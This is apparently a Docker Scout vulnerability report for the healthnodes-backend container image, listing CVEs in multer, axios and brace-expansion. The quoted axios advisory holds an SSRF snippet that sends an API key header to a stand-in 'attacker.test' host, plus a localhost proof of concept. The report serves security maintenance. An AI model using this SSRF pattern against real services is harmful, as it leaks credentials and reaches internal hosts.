<h2>:mag: Vulnerabilities of <code>adityagaikwad888/healthnodes-backend:20</code></h2>

<details open="true"><summary>:package: Image Reference</strong> <code>adityagaikwad888/healthnodes-backend:20</code></summary>
<table>
<tr><td>digest</td><td><code>sha256:f7cef0528c0feb014c7ef74fc118843f3796dac7248003542573aa72ac2aebb6</code></td><tr><tr><td>vulnerabilities</td><td><img alt="critical: 0" src="https://img.shields.io/badge/critical-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/high-2-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/medium-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/low-1-fce1a9"/> <!-- unspecified: 0 --></td></tr>
<tr><td>platform</td><td>linux/amd64</td></tr>
<tr><td>size</td><td>92 MB</td></tr>
<tr><td>packages</td><td>205</td></tr>
</table>
</details></table>
</details>

<table>
<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>multer</strong> <code>1.4.5-lts.1</code> (npm)</summary>

<small><code>pkg:npm/multer@1.4.5-lts.1</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-47935?s=github&n=multer&t=npm&vr=%3C2.0.0"><img alt="high 7.5: CVE--2025--47935" src="https://img.shields.io/badge/CVE--2025--47935-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Missing Release of Memory after Effective Lifetime</i>

<table>
<tr><td>Affected range</td><td><code><2.0.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.0.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.049%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

Multer <2.0.0 is vulnerable to a resource exhaustion and memory leak issue due to improper stream handling. When the HTTP request stream emits an error, the internal `busboy` stream is not closed, violating Node.js stream safety guidance.

This leads to unclosed streams accumulating over time, consuming memory and file descriptors. Under sustained or repeated failure conditions, this can result in denial of service, requiring manual server restarts to recover. All users of Multer handling file uploads are potentially impacted.


### Patches

Users should upgrade to `2.0.0`


### Workarounds

None

### References

- https://github.com/expressjs/multer/pull/1120
- https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>axios</strong> <code>1.7.9</code> (npm)</summary>

<small><code>pkg:npm/axios@1.7.9</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-27152?s=github&n=axios&t=npm&vr=%3E%3D1.0.0%2C%3C1.8.2"><img alt="high 7.7: CVE--2025--27152" src="https://img.shields.io/badge/CVE--2025--27152-lightgrey?label=high%207.7&labelColor=e25d68"/></a> <i>Server-Side Request Forgery (SSRF)</i>

<table>
<tr><td>Affected range</td><td><code>>=1.0.0<br/><1.8.2</code></td></tr>
<tr><td>Fixed version</td><td><code>1.8.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:P</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.021%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

A previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery).
Reference: axios/axios#6463

A similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.

### Details

Consider the following code snippet:

```js
import axios from "axios";

const internalAPIClient = axios.create({
  baseURL: "http://example.test/api/v1/users/",
  headers: {
    "X-API-KEY": "1234567890",
  },
});

// const userId = "123";
const userId = "http://attacker.test/";

await internalAPIClient.get(userId); // SSRF
```

In this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.

It is recommended that:

-	When `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.
-	Before sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.

### PoC

Follow the steps below to reproduce the issue:

1.	Set up two simple HTTP servers:

```
mkdir /tmp/server1 /tmp/server2
echo "this is server1" > /tmp/server1/index.html 
echo "this is server2" > /tmp/server2/index.html
python -m http.server -d /tmp/server1 10001 &
python -m http.server -d /tmp/server2 10002 &
```


2.	Create a script (e.g., main.js):

```js
import axios from "axios";
const client = axios.create({ baseURL: "http://localhost:10001/" });
const response = await client.get("http://localhost:10002/");
console.log(response.data);
```

3.	Run the script:

```
$ node main.js
this is server2
```

Even though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.

### Impact

-	Credential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.
-	SSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.
-	Affected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>brace-expansion</strong> <code>1.1.11</code> (npm)</summary>

<small><code>pkg:npm/brace-expansion@1.1.11</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-5889?s=github&n=brace-expansion&t=npm&vr=%3E%3D1.0.0%2C%3C%3D1.1.11"><img alt="low 1.3: CVE--2025--5889" src="https://img.shields.io/badge/CVE--2025--5889-lightgrey?label=low%201.3&labelColor=fce1a9"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code>>=1.0.0<br/><=1.1.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.1.12</code></td></tr>
<tr><td>CVSS Score</td><td><code>1.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.052%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>16th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.

</blockquote>
</details>
</details></td></tr>
</table>

